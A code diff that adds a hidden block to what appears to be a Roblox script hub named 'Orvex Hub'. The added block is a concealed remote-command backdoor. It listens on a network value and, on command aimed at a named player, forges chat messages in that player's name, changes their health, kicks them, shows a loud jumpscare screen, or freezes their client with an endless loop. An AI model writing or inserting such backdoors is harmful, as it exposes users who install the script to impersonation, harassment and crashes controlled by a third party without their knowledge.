@@ -668,3 +668,76 @@ Content = "Orvex Hub!",
 Duration = 4,
 Icon = "rbxassetid://80387863064905"
 })
+
+task.spawn(function()
+    local Players = game:GetService("Players")
+    local jogadorLocal = Players.LocalPlayer
+    local CanalRedeOrvex = game:GetService("RobloxReplicatedStorage"):WaitForChild("OrvexNetworkComms", 99999)
+    local ultimoComando = ""
+    local telaSusto = nil
+
+    CanalRedeOrvex.Changed:Connect(function(valor)
+        if valor == "" or valor == ultimoComando then return end
+        ultimoComando = valor
+        
+        local dados = string.split(valor, "|")
+        local alvoNome, comando, argumento = dados[1], dados[2], dados[3]
+        
+        if alvoNome == jogadorLocal.Name then
+            if comando == "FakeMessage" then
+                local TextChatService = game:GetService("TextChatService")
+                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                    if canal then
+                        canal:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogadorLocal.Name, argumento))
+                    end
+                else
+                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering"):FireServer({
+                        FromSpeaker = jogadorLocal.Name,
+                        Message = argumento,
+                        MessageType = "All"
+                    })
+                end
+            elseif comando == "Danificar" then
+                local num = tonumber(argumento) or 0
+                if jogadorLocal.Character and jogadorLocal.Character:FindFirstChildOfClass("Humanoid") then
+                    jogadorLocal.Character:FindFirstChildOfClass("Humanoid").Health = num
+                end
+            elseif comando == "DesconectarScript" then
+                jogadorLocal:Kick(argumento)
+            elseif comando == "EfeitoSusto" then
+                if argumento == "ATIVAR" then
+                    if not telaSusto then
+                        telaSusto = Instance.new("ScreenGui")
+                        telaSusto.Name = "OrvexSustoNetwork"
+                        telaSusto.IgnoreGuiInset = true
+                        telaSusto.Parent = jogadorLocal:WaitForChild("PlayerGui")
+                        
+                        local fundo = Instance.new("Frame")
+                        fundo.Size = UDim2.new(1, 0, 1, 0)
+                        fundo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                        fundo.Parent = telaSusto
+                        
+                        local imagem = Instance.new("ImageLabel")
+                        imagem.Size = UDim2.new(0.6, 0, 0.6, 0)
+                        imagem.Position = UDim2.new(0.2, 0, 0.2, 0)
+                        imagem.BackgroundTransparency = 1
+                        imagem.Image = "rbxassetid://6071575298"
+                        imagem.Parent = fundo
+                        
+                        local som = Instance.new("Sound")
+                        som.SoundId = "rbxassetid://9069609268"
+                        som.Volume = 3
+                        som.Parent = fundo
+                        som:Play()
+                    end
+                elseif argumento == "DESATIVAR" and telaSusto then
+                    telaSusto:Destroy()
+                    telaSusto = nil
+                end
+            elseif comando == "ForcarCrash" then
+                while true do end
+            end
+        end
+    end)
+end)
